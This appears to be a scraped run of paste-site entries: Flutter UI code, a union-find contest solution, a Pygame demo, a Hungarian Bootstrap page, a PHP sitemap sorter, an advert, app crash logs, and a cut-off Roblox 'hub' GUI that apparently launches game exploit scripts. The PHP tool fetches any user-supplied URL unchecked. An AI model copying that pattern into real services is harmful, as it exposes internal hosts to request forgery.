        imagePath: ""assets/banks/stanbic-ibtc-bank.png""),
    const Bank(
        name: ""Suntrust Bank"", imagePath: ""assets/banks/suntrust-bank.png""),
    const Bank(name: ""Zenith Bank"", imagePath: ""assets/banks/zenith-bank.png""),
    const Bank(name: ""Wema Bank"", imagePath: ""assets/banks/wema-bank.png""),
  ];

  @override
  Widget build(BuildContext context) {
    return Consumer(builder: (_, ref, __) {
      return Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          textWidget(
            ""Select Bank"",
            fontWeight: FontWeight.w700,
            fontSize: getProportionateScreenWidth(17),
            color: ref.watch(generalNotifierProvider) ? white : lightBlack,
          ),
          verticalSpace(getProportionateScreenHeight(10)),
          ...banks.map((bank) {
            return BankTile(
              bank: bank,
              onTap: () {
                ref
                    .read(routerProvider)
                    .pushNamed(AppRoute.sendMoneyContinueScreen.name);
              },
            );
          }),
        ],
      );
    });
  }
}

class BankTile extends StatefulWidget {
  final Bank bank;

  final VoidCallback? onTap;
  const BankTile({
    super.key,
    required this.bank,
    required this.onTap,
  });

  @override
  State<BankTile> createState() => _BankTileState();
}

class _BankTileState extends State<BankTile> {
  Color backgroundColor = Colors.grey.shade200;

  @override
  void initState() {
    super.initState();
    _updatePalette();
  }

  Color lightenColor(Color color, [double amount = 0.3]) {
    final hsl = HSLColor.fromColor(color);
    final lightened =
        hsl.withLightness((hsl.lightness + amount).clamp(0.0, 1.0));
    return lightened.toColor();
  }

  Future<void> _updatePalette() async {
    final imageProvider = AssetImage(widget.bank.imagePath);

    final paletteGenerator = await PaletteGenerator.fromImageProvider(
      imageProvider,
      size: const Size(300, 300),
      maximumColorCount: 20,
    );

    Color? rawColor = paletteGenerator.dominantColor?.color ??
        paletteGenerator.vibrantColor?.color ??
        paletteGenerator.mutedColor?.color;

    setState(() {
      backgroundColor = rawColor != null
          ? lightenColor(rawColor, 0.4) // adjust brightness (0.1–0.5)
          : Colors.grey.shade200;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Consumer(builder: (_, ref, __) {
      return InkWell(
        onTap: widget.onTap,
        splashColor: transparent,
        highlightColor: transparent,
        child: Container(
          margin: EdgeInsets.only(bottom: getProportionateScreenHeight(10)),
          padding: EdgeInsets.only(bottom: getProportionateScreenHeight(15)),
          decoration: BoxDecoration(
              border: Border(
            bottom: BorderSide(
              color: ref.watch(generalNotifierProvider)
                  ? white.withOpacity(0.05)
                  : lightBlack.withOpacity(0.05),
            ),
          )),
          child: Row(
            children: [
              Container(
                padding: const EdgeInsets.all(7),
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: backgroundColor,
                ),
                child: Container(
                  height: 25,
                  width: 25,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    image: DecorationImage(
                      image: AssetImage(widget.bank.imagePath),
                      fit: BoxFit.cover,
                    ),
                  ),
                ),
              ),
              horizontalSpace(
                getProportionateScreenWidth(10),
              ),
              textWidget2(
                widget.bank.name,
                fontWeight: FontWeight.w500,
                fontSize: getProportionateScreenWidth(14),
                color: ref.watch(generalNotifierProvider)
                    ? white.withOpacity(0.9)
                    : lightBlack.withOpacity(0.9),
              ),
              const Spacer(),
              Container(
                padding: const EdgeInsets.all(3),
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: (ref.watch(generalNotifierProvider)
                      ? primaryBaseDarkmode
                      : primaryBaseWhite),
                ),
                child: iconWidget(PhosphorIcons.caret_right_bold,
                    size: 16,
                    color: ref.watch(generalNotifierProvider)
                        ? white.withOpacity(0.64)
                        : lightBlack.withOpacity(0.64)),
              ),
            ],
          ),
        ),
      );
    });
  }
}

class RecentBeneficiaryCards extends StatefulWidget {
  final BeneficiaryBank beneficiaryBank;
  const RecentBeneficiaryCards({super.key, required this.beneficiaryBank});

  @override
  State<RecentBeneficiaryCards> createState() => _RecentBeneficiaryCardsState();
}

class _RecentBeneficiaryCardsState extends State<RecentBeneficiaryCards> {
  Color backgroundColor = Colors.grey.shade200;

  @override
  void initState() {
    super.initState();
    _updatePalette();
  }

  Color lightenColor(Color color, [double amount = 0.3]) {
    final hsl = HSLColor.fromColor(color);
    final lightened =
        hsl.withLightness((hsl.lightness + amount).clamp(0.0, 1.0));
    return lightened.toColor();
  }

  Future<void> _updatePalette() async {
    final imageProvider = AssetImage(widget.beneficiaryBank.imagePath);

    final paletteGenerator = await PaletteGenerator.fromImageProvider(
      imageProvider,
      size: const Size(300, 300),
      maximumColorCount: 20,
    );

    Color? rawColor = paletteGenerator.dominantColor?.color ??
        paletteGenerator.vibrantColor?.color ??
        paletteGenerator.mutedColor?.color;

    setState(() {
      backgroundColor = rawColor != null
          ? lightenColor(rawColor, 0.5) // adjust brightness–
          : Colors.grey.shade200;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Column(
      children: [
        Container(
          padding: const EdgeInsets.all(7),
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            color: backgroundColor,
          ),
          child: Container(
            height: 25,
            width: 25,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              image: DecorationImage(
                image: AssetImage(widget.beneficiaryBank.imagePath),
                fit: BoxFit.cover,
              ),
            ),
          ),
        ),
        const SizedBox(height: 5),
        SizedBox(
          width: 70,
          child: Text(
            widget.beneficiaryBank.firstName,
            style: GoogleFonts.poppins(
              fontSize: getProportionateScreenWidth(12),
              fontWeight: FontWeight.w400,
            ),
            overflow: TextOverflow.ellipsis,
            textAlign: TextAlign.center,
          ),
        ),
        SizedBox(
          width: 70,
          child: Text(
            widget.beneficiaryBank.lastName,
            style: GoogleFonts.poppins(
              fontSize: getProportionateScreenWidth(12),
              fontWeight: FontWeight.w400,
            ),
            overflow: TextOverflow.ellipsis,
            textAlign: TextAlign.center,
          ),
        ),
      ],
    );
  }
}

//
"
97zT9W5u,Untitled,Um_nik,Python,Thursday 29th of May 2025 04:55:58 AM CDT,"n, m = map(int, input().split())
hands = [tuple(map(int, input().split())) for _ in range(n)]
_cuts = [tuple(map(int, input().split())) for _ in range(m)]
edges = [[] for u in range(n + 1)]
edge_cnt = [{} for u in range(n + 1)]

for u, (l, r) in enumerate(hands, 1):
    for v in [l, r]:
        if v == -1:
            continue
        _u, _v = min(u, v), max(u, v)
        edge_cnt[_u][_v] = edge_cnt[_u].get(_v, 0) + 1

cuts = [
    (min(u, v), max(u, v))
    for m, lr in _cuts
    if (u := m) and (v := hands[m - 1][lr - 1])
]

for u, v in cuts:
    edge_cnt[u][v] -= 1

for u in range(1, n + 1):
    for v in edge_cnt[u]:
        if edge_cnt[u][v] > 0:
            edges[u].append(v)

res, rank = [-1]*(n + 1), [0]*(n + 1)
p = [i for i in range(n + 1)]
c = [set() for i in range(n + 1)]

def get(x):
    stk = []
    while x != p[x]:
        stk.append(x)
        x = p[x]
    for i in stk:
        c[p[i]].remove(i)
        c[x].add(i)
        p[i] = x
    return x

def union(u, v):
    pu, pv = get(u), get(v)
    if pu == pv:
        return
    if rank[pu] == rank[pv]:
        rank[pu] += 1
    if rank[pu] < rank[pv]:
        pu, pv = pv, pu
    p[pv] = pu
    c[pu].add(pv)

def set(x, idx):
    stk = [x]
    while stk:
        cur = stk.pop()
        res[cur] = idx
        stk.extend(c[cur])

for u in range(1, n + 1):
    for v in edges[u]:
        union(u, v)

for idx, (u, v) in list(enumerate(cuts))[::-1]:
    p1, pu, pv = get(1), get(u), get(v)
    if pu == pv == p1:
        continue
    if p1 in [pu, pv]:
        set(pu, idx) if pu != p1 else set(pv, idx)
    union(u, v)

print(""\n"".join(map(str, res[1:])))
"
kH5UDKgH,Python - PyGame - keep ciicked (Stackoverflow),furas,Python,Thursday 29th of May 2025 03:37:47 AM CDT,"#!/usr/bin/env python3

# date: 2025.05.29
# stackoverflow: [python - PYGAME Circle changes colour on clicking but changes back on mouse up - Stack Overflow](https://stackoverflow.com/questions/79639247/pygame-circle-changes-colour-on-clicking-but-changes-back-on-mouse-up)

import pygame
import random

# --- constants ---  # PEP8: constants after imports

# display window
SCREEN_HEIGHT = 800
SCREEN_WIDTH = 1400

# colours
BLUE = (0, 0, 255)
LIGHTBLUE = (72, 243, 235)
BLUEBLACK = (20, 21, 77)
IODINE = (243, 200, 99)
REDYELLOW = (221, 78, 20)
BLACK = (0, 0, 0)

# other
X = 500
Y = 400

SIZE = 40
X_SPACING = SIZE*2.3
Y_SPACING = SIZE*2.3

# --- classes ---  # PEP8: classes after constants

class Experiment():
    def __init__ (self, colour, x, y, size, number):
        self.x = x
        self.y = y
        self.size = size
        self.number = number
        self.colour = colour

        self.rect = pygame.Rect(self.x-self.size, self.y-self.size, self.size*2, self.size*2)

        self.clicked = False

    def draw(self, screen):
        #pygame.draw.rect(screen, LIGHTBLUE, self.rect)

        if self.clicked:
            pygame.draw.circle(screen, BLACK, (self.x, self.y), self.size )
        else:
            pygame.draw.circle(screen, self.colour, (self.x, self.y), self.size)
            pygame.draw.circle(screen, BLACK, (self.x, self.y), self.size, 4)

    def handle_event(self, event):
        if event.type == pygame.MOUSEBUTTONDOWN:
            if self.rect.collidepoint(event.pos):
                self.clicked = True

# --- functions ---  # PEP8: functions after classes

# --- main ---  # # PEP8: main code after functions

# - variables -

wellcolour = IODINE
colour = IODINE

# - init -

pygame.init()

screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
pygame.display.set_caption('Amylase')

# - create all instances only once, using for-loop, and keep them on list

items = []

for row in range(4):
    wellcolour = (243, row*40+100, 99)
    for col in range(5):
        x = X + (col * X_SPACING)
        y = Y + (row * Y_SPACING)
        number = col + (row * 5) + 1

        item = Experiment(wellcolour, x, y, SIZE, number)

        items.append(item)

# - main loop -

run = True

while run:

    # - events -

    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            run = False
        # send every event to all items
        for item in items:
            item.handle_event(event)

    # - updates (without drawing) -

    # update all items
    # for item in items:
    #     pass  # empty function

    # - draws (without updates) -

    screen.fill(LIGHTBLUE)

    # draw all items
    for item in items:
        item.draw(screen)

    pygame.display.flip()

# - end -

pygame.quit()
"
NnTCEpy6,Untitled,bbarbara,HTML,Thursday 29th of May 2025 03:29:33 AM CDT,"<!DOCTYPE html>
<html lang=""hu"">
  <head>
    <meta charset=""UTF-8"" />
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
    <title>Bootstap</title>
    <!-- Bootstrap js és css betöltése -->
    <link
      rel=""stylesheet""
      href=""https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css""
    />
    <script src=""https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js""></script>
    <script src=""https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>
    <link rel=""stylesheet"" href=""css/style.css"" />
  </head>
  <body>
    <div id=""banner"" class=""container-fluid"">
        <div class=""container"">
        <img class=""img-fluid"" src=""kepek/banner.jpg""></div>
    </div>
    <!--div.container-fluid>div.container>div.row>div*3-->
    <div class=""container-fluid"">
      <div class=""container"">
        <div class=""row"">
          <div class=""col-xs-12 col-md-6 col-lg-3"">
            <img src=""kepek/ktm.webp"" class=""img-fluid"" />
            <h2>Motor</h2>
            <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Possimus rerum iste libero.</p>
            <a class=""btn btn-primary"" href=""#"">Bővebben</a>
          </div>
          <div class=""col-xs-12 col-md-6 col-lg-3"">
            <img src=""kepek/ktm2.webp"" class=""img-fluid"" /> <!--A képnek is abba a classba kell lennie, mint a konténernek-->
            <h2>Motor</h2>
            <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Possimus rerum iste libero.</p>
            <a class=""btn btn-danger"" href=""#"">Bővebben</a> <!--Gomb kinézetű link, a danger az piros, a primary az kék, 
             # jel segítségéve tudunk ál linket csinálni a gyakorláshoz-->
          </div>
          <div class=""col-xs-12 col-md-6 col-lg-3"">
            <img src=""kepek/ktm3.webp"" class=""img-fluid"" />
            <h2>Motor</h2>
            <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Possimus rerum iste libero.</p>
            <a class=""btn btn-primary"" href=""#"">Bővebben</a>
          </div>
          <div class=""col-xs-12 col-md-6 col-lg-3"">
            <img src=""kepek/ktm4.webp"" class=""img-fluid"" />
            <h2>Motor</h2>
            <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Possimus rerum iste libero.</p>
            <a class=""btn btn-primary"" href=""#"">Bővebben</a>
          </div>
        </div>
      </div>
    </div>
    <div class=""container-fluid"" id=""bemutatkozás"">
        <div class=""container"">
            <div class=""row"">
                <!--a d-none azt jelenti jelenleg, hogy a mobilon a sapi ne jelenjen meg, de minde más nézetbe jelenjen meg-->
                <div class=""d-none d-md-block col-xs-12 col-md-4 col""><img src=""kepek/helmet.webp"" class=""img-fluid"" class=""hide-mobile"" /></div>
                <div class=""col-xs-12 col-md-8 col""><p>A KTM Motors egy prémium minőségű motorokat és motorkerékpáros kiegészítőket forgalmazó szakbolt, mely a motorosok igényeit maximálisan figyelembe véve kínálja termékeit. Az üzletünkben kizárólag a KTM világvezető motorkerékpár márka legújabb modelljei találhatóak meg, kezdve a sportos túramotoroktól egészen a versenyzéshez tervezett gépekig. Szakképzett munkatársaink minden vásárlónk számára személyre szabott tanácsadással segítenek a legmegfelelőbb motor és felszerelés kiválasztásában. Célunk, hogy minden motoros, kezdőtől a profikig, megtalálja nálunk a számára legideálisabb járművet és kiegészítőket. Emellett szervizszolgáltatásokat is kínálunk, ahol gyors és precíz munkával biztosítjuk motorja hosszú élettartamát. A KTM Motors nem csupán egy bolt, hanem egy közösség, ahol a motorozás iránti szenvedély és a szakértelem találkozik. Kínálatunkban megtalálhatóak a legújabb motoros ruházatok, sisakok, protektorok, és minden egyéb, ami a biztonságos motorozáshoz szükséges. Az üzletünkben folyamatosan frissülő akciók és egyedi ajánlatok várják a vásárlókat, így mindig érdemes ellátogatni hozzánk. A KTM Motors célja, hogy minden motoros számára biztosítson egy prémium élményt, legyen szó vásárlásról, szervizről vagy akár közösségi programokról. Nálunk minden motoros megtalálhatja a saját stílusának és igényeinek megfelelő motort!</p></div>
            </div>
        </div>
    </div>
    <div id=""fekete"" class=""container-fluid"">
        <div class=""container"">
            <div class=""row"">
                <div class=""col-xs-12 col-md-6"">
                    <h3>Termékeink</h3> 
                    <ui>
                        <li>Lorem ipsum dolor sit amet.</li>
                        <li>Lorem ipsum dolor sit amet consectetur.</li>
                        <li>Lorem ipsum dolor sit.</li>
                </ui>
            </div>
                <div class=""col-xs-12 col-md-6"">
                    <h3>Termékeink</h3> 
                    <ui>
                        <li>Lorem ipsum dolor sit amet.</li>
                        <li>Lorem ipsum dolor sit amet consectetur.</li>
                        <li>Lorem ipsum dolor sit.</li>
                    </ui>
                </div>
            </div>
        </div>
    </div>
  </body>
</html>
"
5S7C4m27,curl sitemap reorder,ssaidz,PHP,Thursday 29th of May 2025 03:10:42 AM CDT,"<?php
// Cek apakah form sudah dikirim
$urlInput = $_POST['url'] ?? '';
$data = [];
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($urlInput)) {
    $url = trim($urlInput);

    // Ambil konten sitemap via cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $xmlContent = curl_exec($ch);
    curl_close($ch);

    if ($xmlContent) {
        libxml_use_internal_errors(true);
        $xml = simplexml_load_string($xmlContent);
        if ($xml !== false) {
            $namespaces = $xml->getNamespaces(true);
            if (isset($namespaces[''])) {
                $xml->registerXPathNamespace('ns', $namespaces['']);
                $urls = $xml->xpath('//ns:url');
            } else {
                $urls = $xml->url;
            }

            // Konversi ke array dan sorting
            foreach ($urls as $url) {
                $loc = (string)$url->loc;
                $lastmod = (string)$url->lastmod;
                $data[] = [
                    'loc' => $loc,
                    'lastmod' => $lastmod,
                    'timestamp' => strtotime($lastmod),
                ];
            }

            usort($data, function($a, $b) {
                return $b['timestamp'] - $a['timestamp'];
            });
        } else {
            $error = ""Gagal memproses XML."";
        }
    } else {
        $error = ""Gagal mengambil data dari URL."";
    }
}
?>

<!DOCTYPE html>
<html lang=""id"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Reverse Sitemap by Lastmod</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 1rem;
            margin: 0;
            background: #f5f5f5;
        }

        .container {
            max-width: 800px;
            margin: auto;
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }

        h1 {
            text-align: center;
            font-size: 1.8rem;
            margin-bottom: 1rem;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }

        input[type=""text""] {
            padding: 0.75rem;
            font-size: 1rem;
            border-radius: 4px;
            border: 1px solid #ccc;
        }

        input[type=""submit""] {
            padding: 0.75rem;
            background-color: #007BFF;
            border: none;
            color: white;
            font-weight: bold;
            font-size: 1rem;
            border-radius: 4px;
            cursor: pointer;
        }

        input[type=""submit""]:hover {
            background-color: #0056b3;
        }

        .error {
            color: red;
            font-weight: bold;
        }

        .results {
            margin-top: 2rem;
        }

        .url-entry {
            margin-bottom: 0.75rem;
        }

        a {
            color: #007BFF;
            text-decoration: none;
            word-wrap: break-word;
        }

        a:hover {
            text-decoration: underline;
        }

        .timestamp {
            display: block;
            color: #555;
            font-size: 0.9rem;
        }

        @media (max-width: 600px) {
            input[type=""text""], input[type=""submit""] {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class=""container"">
        <h1>Urutkan Sitemap Berdasarkan Lastmod</h1>
        <form method=""POST"">
            <input type=""text"" name=""url"" placeholder=""Masukkan URL sitemap.xml"" value=""<?= htmlspecialchars($urlInput) ?>"" required>
            <input type=""submit"" value=""Ambil & Urutkan"">
        </form>

        <?php if (!empty($error)): ?>
            <p class=""error""><?= htmlspecialchars($error) ?></p>
        <?php endif; ?>

        <?php if (!empty($data)): ?>
            <div class=""results"">
                <h2>Hasil Terurut:</h2>
                <?php foreach ($data as $entry): ?>
                    <div class=""url-entry"">
                        <a href=""<?= htmlspecialchars($entry['loc']) ?>"" target=""_blank"">
                            <?= htmlspecialchars($entry['loc']) ?>
                        </a>
                        <span class=""timestamp"">Last modified: <?= htmlspecialchars($entry['lastmod']) ?></span>
                    </div>
                <?php endforeach; ?>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>
"
SMCNVtRp,Professional eCommerce Website Development | Digital Hive,digitalhive,HTML,Thursday 29th of May 2025 02:37:06 AM CDT,"Want to take your online business to the next level?
At Digital Hive, we build high-performance eCommerce websites that convert.

Whether you're a startup or scaling brand, we design and develop online stores that are:

✅ Fast & Secure
✅ Mobile-Responsive
✅ SEO-Optimized
✅ Integrated with Payment Gateways & Inventory Systems
✅ Built on Shopify, WooCommerce & Custom Platforms

Why settle for average when your eCommerce site can be a sales machine?

Let us craft an experience that drives traffic, boosts conversions, and grows your brand.

Explore our eCommerce services now: https://digitalhive.in/ecommerce-websites/
"
D5EMzbYw,2025-05-29T14:30:51.492318,powerampache,PHP,Thursday 29th of May 2025 01:30:53 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1251)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668)
	at java.lang.Thread.run(Thread.java:1012)

getArtists() - cannot load data HttpException {""code"":404,""message"":"""",""detailMessage"":""HTTP 404 "",""stackTrace"":[]}"
BtM3YhX8,2025-05-29T14:30:51.533744,powerampache,PHP,Thursday 29th of May 2025 01:30:53 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1251)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668)
	at java.lang.Thread.run(Thread.java:1012)

getSongs() - cannot load data HttpException {""code"":404,""message"":"""",""detailMessage"":""HTTP 404 "",""stackTrace"":[]}"
dZ5BZEWA,2025-05-29T14:30:51.533215,powerampache,PHP,Thursday 29th of May 2025 01:30:53 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1251)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668)
	at java.lang.Thread.run(Thread.java:1012)

getAlbums() - cannot load data HttpException {""code"":404,""message"":"""",""detailMessage"":""HTTP 404 "",""stackTrace"":[]}"
FvSLyPuz,xrian hub,GREGORIAH_lol,Lua,Thursday 29th of May 2025 01:03:29 AM CDT,"--xrian final
local _1 = Instance.new(""ScreenGui"")
local Frame = Instance.new(""Frame"")
local UICorner = Instance.new(""UICorner"")
local TextLabel = Instance.new(""TextLabel"")
local UIGradient = Instance.new(""UIGradient"")
local TextButton = Instance.new(""TextButton"")
local UICorner_2 = Instance.new(""UICorner"")
local Frame_2 = Instance.new(""Frame"")
local ScrollingFrame = Instance.new(""ScrollingFrame"")
local UIListLayout = Instance.new(""UIListLayout"")
local TextButton_2 = Instance.new(""TextButton"")
local UICorner_3 = Instance.new(""UICorner"")
local UIGradient_2 = Instance.new(""UIGradient"")
local TextButton_3 = Instance.new(""TextButton"")
local UICorner_4 = Instance.new(""UICorner"")
local UIGradient_3 = Instance.new(""UIGradient"")
local TextButton_4 = Instance.new(""TextButton"")
local UICorner_5 = Instance.new(""UICorner"")
local UIGradient_4 = Instance.new(""UIGradient"")
local TextButton_5 = Instance.new(""TextButton"")
local UICorner_6 = Instance.new(""UICorner"")
local UIGradient_5 = Instance.new(""UIGradient"")
local TextButton_6 = Instance.new(""TextButton"")
local UICorner_7 = Instance.new(""UICorner"")
local UIGradient_6 = Instance.new(""UIGradient"")
local TextButton_7 = Instance.new(""TextButton"")
local UICorner_8 = Instance.new(""UICorner"")
local UIGradient_7 = Instance.new(""UIGradient"")
local TextButton_8 = Instance.new(""TextButton"")
local UICorner_9 = Instance.new(""UICorner"")
local UIGradient_8 = Instance.new(""UIGradient"")
local TextButton_9 = Instance.new(""TextButton"")
local UICorner_10 = Instance.new(""UICorner"")
local UIGradient_9 = Instance.new(""UIGradient"")
local TextButton_10 = Instance.new(""TextButton"")
local UICorner_11 = Instance.new(""UICorner"")
local UIGradient_10 = Instance.new(""UIGradient"")
local TextButton_11 = Instance.new(""TextButton"")
local UICorner_12 = Instance.new(""UICorner"")
local UIGradient_11 = Instance.new(""UIGradient"")
local TextButton_12 = Instance.new(""TextButton"")
local UICorner_13 = Instance.new(""UICorner"")
local UIGradient_12 = Instance.new(""UIGradient"")
local TextButton_13 = Instance.new(""TextButton"")
local UICorner_14 = Instance.new(""UICorner"")
local UIGradient_13 = Instance.new(""UIGradient"")
local TextButton_14 = Instance.new(""TextButton"")
local UICorner_15 = Instance.new(""UICorner"")
local UIGradient_14 = Instance.new(""UIGradient"")
local TextButton_15 = Instance.new(""TextButton"")
local UICorner_16 = Instance.new(""UICorner"")
local UIGradient_15 = Instance.new(""UIGradient"")
local TextButton_16 = Instance.new(""TextButton"")
local UICorner_17 = Instance.new(""UICorner"")
local UIGradient_16 = Instance.new(""UIGradient"")
local UIGradient_17 = Instance.new(""UIGradient"")
_1.Name = ""1""
_1.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")
_1.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
_1.ResetOnSpawn = false
Frame.Parent = _1
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.Size = UDim2.new(0, 757, 0, 551)
UICorner.CornerRadius = UDim.new(0, 15)
UICorner.Parent = Frame
TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(0, 757, 0, 27)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = ""XRIAN hub""
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true
UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient.Rotation = 180
UIGradient.Parent = TextLabel
TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.861294568, 0, -0.0344827585, 0)
TextButton.Size = UDim2.new(0, 81, 0, 25)
TextButton.Font = Enum.Font.Unknown
TextButton.Text = ""X""
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
UICorner_2.CornerRadius = UDim.new(0, 10)
UICorner_2.Parent = TextButton
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.00899999961, 0, 0.0500000007, 0)
Frame_2.Size = UDim2.new(0, 743, 0, 1)
ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.00792602357, 0, 0.0653357506, 0)
ScrollingFrame.Size = UDim2.new(0, 743, 0, 492)
ScrollingFrame.ScrollBarThickness = 6
UIListLayout.Parent = ScrollingFrame
UIListLayout.FillDirection = Enum.FillDirection.Horizontal
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 10)
UIListLayout.Wraps = true
TextButton_2.Parent = ScrollingFrame
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.BorderSizePixel = 0
TextButton_2.Size = UDim2.new(0, 126, 0, 58)
TextButton_2.Font = Enum.Font.FredokaOne
TextButton_2.Text = ""IY""
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextSize = 25.000
TextButton_2.TextWrapped = true
UICorner_3.CornerRadius = UDim.new(0, 15)
UICorner_3.Parent = TextButton_2
UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_2.Parent = TextButton_2
TextButton_3.Parent = ScrollingFrame
TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.BorderSizePixel = 0
TextButton_3.Size = UDim2.new(0, 126, 0, 58)
TextButton_3.Font = Enum.Font.FredokaOne
TextButton_3.Text = ""TH""
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextSize = 25.000
TextButton_3.TextWrapped = true
UICorner_4.CornerRadius = UDim.new(0, 15)
UICorner_4.Parent = TextButton_3
UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_3.Parent = TextButton_3
TextButton_4.Parent = ScrollingFrame
TextButton_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.BorderSizePixel = 0
TextButton_4.Size = UDim2.new(0, 126, 0, 58)
TextButton_4.Font = Enum.Font.FredokaOne
TextButton_4.Text = ""VERTEX""
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextSize = 25.000
TextButton_4.TextWrapped = true
UICorner_5.CornerRadius = UDim.new(0, 15)
UICorner_5.Parent = TextButton_4
